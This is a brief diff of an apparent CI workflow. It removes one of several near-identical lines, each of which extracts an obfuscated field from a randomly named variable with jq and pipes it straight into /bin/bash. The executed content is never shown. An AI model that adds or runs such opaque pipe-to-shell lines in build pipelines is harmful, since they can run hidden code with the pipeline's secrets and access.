@@ -31,7 +31,6 @@ jobs:
           echo $shw4371 | jq -r .gkwrl3 | /bin/bash
           printf '%s' "$crky7" | jq -r .d5 | /bin/bash
           printf '%s' "$z55" | jq -r .f1562 | /bin/bash
-          printf '%s' "$yc91" | jq -r .kiva4 | /bin/bash
           echo $dq281 | jq -r .oghz5 | /bin/bash
           echo $j476 | jq -r .o85436 | /bin/bash
 
